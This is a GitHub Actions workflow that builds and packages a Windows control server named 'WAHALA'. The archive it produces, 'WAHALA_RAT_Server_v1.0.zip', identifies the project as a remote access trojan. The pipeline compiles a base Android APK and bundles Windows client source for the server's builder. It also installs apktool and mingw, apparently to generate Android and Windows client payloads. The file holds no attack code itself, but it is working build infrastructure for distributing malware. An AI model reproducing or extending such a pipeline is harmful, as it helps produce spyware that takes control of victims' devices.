name: Build WAHALA Server

on:
  push:
    branches: [ "main", "master" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest

    steps:
    - name: Checkout Repository
      uses: actions/checkout@v4

    - name: Setup .NET 8.0 SDK
      uses: actions/setup-dotnet@v4
      with:
        dotnet-version: '8.0.x'

    - name: Setup Java JDK
      uses: actions/setup-java@v4
      with:
        distribution: 'temurin'
        java-version: '17'

    - name: Setup Android SDK (base)
      uses: android-actions/setup-android@v3
      with:
        packages: platform-tools
        accept-android-sdk-licenses: true

    - name: Install Android SDK Packages
      run: |
        sdkmanager "platforms;android-34" "build-tools;34.0.0"
      shell: powershell

    - name: Install System Tools (mingw-w64, apktool)
      run: |
        choco install mingw --no-progress -y

        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/windows/apktool.bat" -OutFile "apktool.bat"
        Invoke-WebRequest -Uri "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar" -OutFile "apktool.jar"
        Move-Item apktool.jar C:\Windows\apktool.jar
        Move-Item apktool.bat C:\Windows\apktool.bat

        echo "C:\ProgramData\chocolatey\lib\mingw\tools\install\mingw64\bin" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append
      shell: powershell

    - name: Setup Gradle
      uses: gradle/actions/setup-gradle@v3
      with:
        gradle-version: 8.5

    - name: Compile Android Base APK
      run: |
        cd WAHALA-Client-Android
        gradle assembleDebug --no-daemon
        New-Item -ItemType Directory -Force -Path "..\src\WAHALA.Server\ClientSource"
        Copy-Item "app\build\outputs\apk\debug\app-debug.apk" -Destination "..\src\WAHALA.Server\ClientSource\WAHALA_Base.apk"
      shell: powershell

    - name: Prepare Windows Client Source
      run: |
        # Create the exact folder structure the C# builder expects
        New-Item -ItemType Directory -Force -Path "src\WAHALA.Server\ClientSource\src"
        Copy-Item -Path "WAHALA-Client-Win\src\*" -Destination "src\WAHALA.Server\ClientSource\src\" -Recurse -Force
      shell: powershell

    - name: Restore and Publish WPF Server
      run: |
        cd src\WAHALA.Server
        dotnet restore
        dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true /p:IncludeNativeLibrariesForSelfExtract=true -o ..\..\publish
      shell: powershell

    - name: Package Final Artifacts
      run: |
        # Copy the correctly structured ClientSource into the publish folder so it sits next to the .exe
        Copy-Item -Path "src\WAHALA.Server\ClientSource" -Destination "publish\ClientSource" -Recurse -Force
        
        # Zip the publish folder contents
        Compress-Archive -Path "publish\*" -DestinationPath "WAHALA_RAT_Server_v1.0.zip" -Force
      shell: powershell

    - name: Upload Build Artifact
      uses: actions/upload-artifact@v4
      with:
        name: WAHALA-Server-Build
        path: WAHALA_RAT_Server_v1.0.zip
        retention-days: 7